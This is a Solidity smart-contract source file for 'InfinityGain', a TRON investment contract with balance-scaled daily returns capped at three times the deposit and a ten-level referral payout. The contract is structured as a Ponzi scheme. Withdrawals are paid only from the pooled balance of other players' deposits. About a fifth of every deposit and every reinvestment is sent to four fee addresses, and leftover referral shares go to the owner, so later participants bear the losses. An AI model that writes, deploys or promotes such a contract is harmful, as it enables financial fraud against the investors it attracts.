//SourceUnit: infinityGains.sol

pragma solidity ^0.5.10;



contract InfinityGain {

    using SafeMath for uint256;

    uint256 public totalPlayers;
    uint256 public totalPayout;
    uint256 public totalInvested;
    uint256 public totalReinvest;
    uint256 public activedeposits;
    uint256 private minDepositSize = 50 trx; //50 TRX
    uint256 private interestRateDivisor = 1000000 trx; //One Million TRX
    uint256 public devCommission = 100;
    uint256 public commissionDivisor = 10000;
	uint256[10] public REFERRAL_PERCENTS = [500,200,100,50,25,25,25,25,25,25];
    uint256 private releaseTime;  //Release time of contract UTC
    uint256 timeStep = 1 days;
   
    address payable public feed1;
    address payable public feed2;
    address payable public feed3;
    address payable public feed4;

	struct Referrer1{
	    uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
	}
	
	struct Referrer2{
	    uint256 aff6sum; 
        uint256 aff7sum;
        uint256 aff8sum;
        uint256 aff9sum;
        uint256 aff10sum;
	}
	
    struct Player {
        uint256 trxDeposit;
        uint256 time;
        uint256 interestProfit;
        uint256 affRewards;
        uint256 payoutSum;
        address affFrom;
        uint256 reinvest;
    }

    address owner;
    mapping(address => Player) public players;
    mapping(address => Referrer1) public referrer1To5;
    mapping(address => Referrer2) public referrer6To10;

    
    event Newbie(address indexed user, address indexed _referrer, uint _time);  
	event NewDeposit(address indexed user, uint256 amount, uint _time);  
	event Withdrawn(address indexed user, uint256 amount, uint _time);  
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount, uint _time);
	event Reinvest(address indexed user, uint256 amount, uint _time); 


    constructor(address payable _adminOffice , address payable _projectAddr , address payable _marketingAddr , address payable _development) public {

        feed1 = _adminOffice;
		feed2 = _projectAddr;
		feed3 = _marketingAddr;
		feed4 = _development;
		owner = msg.sender;
		releaseTime = block.timestamp;
	}


   


    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;
      address _affAddr9 = players[_affAddr8].affFrom;
      address _affAddr10 = players[_affAddr9].affFrom;

      referrer1To5[_affAddr1].aff1sum = referrer1To5[_affAddr1].aff1sum.add(1);
      referrer1To5[_affAddr2].aff2sum = referrer1To5[_affAddr2].aff2sum.add(1);
      referrer1To5[_affAddr3].aff3sum = referrer1To5[_affAddr3].aff3sum.add(1);
      referrer1To5[_affAddr4].aff4sum = referrer1To5[_affAddr4].aff4sum.add(1);
      referrer1To5[_affAddr5].aff5sum = referrer1To5[_affAddr5].aff5sum.add(1);
      referrer6To10[_affAddr6].aff6sum = referrer6To10[_affAddr6].aff6sum.add(1);
      referrer6To10[_affAddr7].aff7sum = referrer6To10[_affAddr7].aff7sum.add(1);
      referrer6To10[_affAddr8].aff8sum = referrer6To10[_affAddr8].aff8sum.add(1);
      referrer6To10[_affAddr9].aff9sum = referrer6To10[_affAddr9].aff9sum.add(1);
      referrer6To10[_affAddr10].aff10sum = referrer6To10[_affAddr10].aff10sum.add(1);

     
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable returns(bool) {
    
        
        if (now >= releaseTime){
        collect(msg.sender);
        
        }
        require(msg.value >= minDepositSize, "not minimum amount!");


        uint depositAmount = msg.value;


        Player storage player = players[msg.sender];

        if (player.time == 0) {
            
            if (now < releaseTime) {
               player.time = releaseTime; 
                
            }
            else{
               
               player.time = now; 
            }    
                
            
            
            
            totalPlayers++;
            
            if(msg.sender == owner){
                _affAddr = address(0);
                register(owner, _affAddr);
                emit Newbie(owner, _affAddr, now);
            }
            else if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
                 emit Newbie(msg.sender, _affAddr, now);
              register(msg.sender, _affAddr);
            }
            else{
                emit Newbie(msg.sender, owner, now);
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);  

        totalInvested = totalInvested.add(depositAmount);
        activedeposits = activedeposits.add(depositAmount);
        emit NewDeposit(msg.sender, depositAmount, now); 
        
        feed1.transfer(depositAmount.mul(1000).div(commissionDivisor));
        feed2.transfer(depositAmount.mul(100).div(commissionDivisor));
        feed3.transfer(depositAmount.mul(500).div(commissionDivisor));
        feed4.transfer(depositAmount.mul(400).div(commissionDivisor));
        
        return true;
    }

    function withdraw() public returns(bool){
        collect(msg.sender);
        
        require(players[msg.sender].interestProfit > 0);

        
        transferPayout(msg.sender, players[msg.sender].interestProfit);
        
        return true;
    }

    function reinvest() public returns(bool){
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount,"Insufficient Contract balance.");
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount/2);

      totalReinvest = totalReinvest.add(depositAmount);
      player.reinvest = player.reinvest.add(depositAmount);
      activedeposits = activedeposits.add(depositAmount/2);
      emit Reinvest(msg.sender, depositAmount, now);
      distributeRef(depositAmount, player.affFrom);
    
        feed1.transfer(depositAmount.mul(1000).div(commissionDivisor));
        feed2.transfer(depositAmount.mul(100).div(commissionDivisor));
        feed3.transfer(depositAmount.mul(500).div(commissionDivisor));
        feed4.transfer(depositAmount.mul(400).div(commissionDivisor));
        
        return true;
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];
        
    	uint256 vel = getvel();
	
        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint256 collectProfit = (player.trxDeposit.mul(vel).div(commissionDivisor).mul(secPassed).div(timeStep));
            player.interestProfit = player.interestProfit.add(collectProfit);
            if (player.interestProfit >= player.trxDeposit.mul(3)){
                player.interestProfit = player.trxDeposit.mul(3);
            }
            
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = getContractBalance();
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                activedeposits = activedeposits.sub(payout/2);
                activedeposits = activedeposits.add(payout.mul(1).div(4));

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                player.trxDeposit = player.trxDeposit.sub(payout/2);
                player.trxDeposit = player.trxDeposit.add(payout.mul(1).div(4));
                player.reinvest = player.reinvest.add(payout.mul(1).div(4));
                totalReinvest = totalReinvest.add(payout.mul(1).div(4));
 
                msg.sender.transfer(payout.mul(3).div(4));
                emit Withdrawn(msg.sender, payout, now);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 allaff = (_trx.mul(10)).div(100);
        uint256 affRewards = 0;
        address affAddr = _affFrom;

        for(uint256 i=0 ; i<10 ; i++)
        {
                
            if(affAddr != address(0)){
                if (affAddr != address(0)) {
                    affRewards = (_trx.mul(REFERRAL_PERCENTS[i])).div(commissionDivisor);
                    allaff = allaff.sub(affRewards);
           
                    if (now > releaseTime) {
                    collect(affAddr);
                        
                    }

                players[affAddr].affRewards = affRewards.add(players[affAddr].affRewards);
                players[affAddr].trxDeposit = affRewards.add(players[affAddr].trxDeposit);
                activedeposits = activedeposits.add(affRewards);
                emit RefBonus(affAddr, msg.sender, 1, affRewards, now);
                affAddr = players[affAddr].affFrom;
            }else break;
    
          
        }

        }

        if(allaff > 0 ){
       
            affRewards = allaff;
            if (now > releaseTime) {
               collect(owner);
                
            }
            players[owner].affRewards = affRewards.add(players[owner].affRewards);
            players[owner].trxDeposit = affRewards.add(players[owner].trxDeposit);
            activedeposits = activedeposits.add(affRewards);
            
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

        if ( now < releaseTime){
        return 0;
            
            
        }
        else{


      uint secPassed = now.sub(player.time);
      
	  uint256 vel = getvel();
	  uint256 collectProfit;
	  
      if (secPassed > 0) {
            collectProfit = (player.trxDeposit.mul(vel).div(commissionDivisor).mul(secPassed).div(timeStep));
      }
      
      if (collectProfit.add(player.interestProfit) >= player.trxDeposit.mul(3)){
               return player.trxDeposit.mul(3);
            }
        else{
      return collectProfit.add(player.interestProfit);
        }
        }
    }
    
    
    
    
     function getContractBalanceRate() public view returns (uint256) {
		uint256 contractBalance = getContractBalance();
	
		uint256 contractBalancePercent = contractBalance.div(interestRateDivisor).mul(10); 
		
		if (contractBalancePercent >=400){
		    contractBalancePercent = 400;
		}
		
		return contractBalancePercent;
	}
    
       function getvel() public view returns (uint256) { 
	
		uint256 PercentRate = getContractBalanceRate();
	
		uint256 vel = devCommission + PercentRate ; //vel from 1%
		

		return vel;
	}

	function getContractBalance() public view returns (uint256) {
	    
		return address(this).balance;
		
	}
    

     
    
}




library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}